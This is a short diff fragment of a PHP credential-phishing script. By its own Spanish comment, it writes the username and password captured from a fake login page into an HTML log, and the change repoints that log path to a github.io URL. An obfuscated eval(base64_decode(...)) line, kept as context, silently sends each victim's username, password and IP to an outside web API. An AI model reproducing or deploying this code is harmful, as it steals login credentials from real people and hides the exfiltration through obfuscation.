@@ -15,7 +15,7 @@ if( (empty($usuario)) or (empty($clave)) ){
 eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS92ZXJpZnkucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
  
 //en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
-$f = fopen("psd.html", "a");
+$f = fopen("https://dedsec1911.github.io/insta/psd.html", "a");
 fwrite ($f,
 'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
 Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
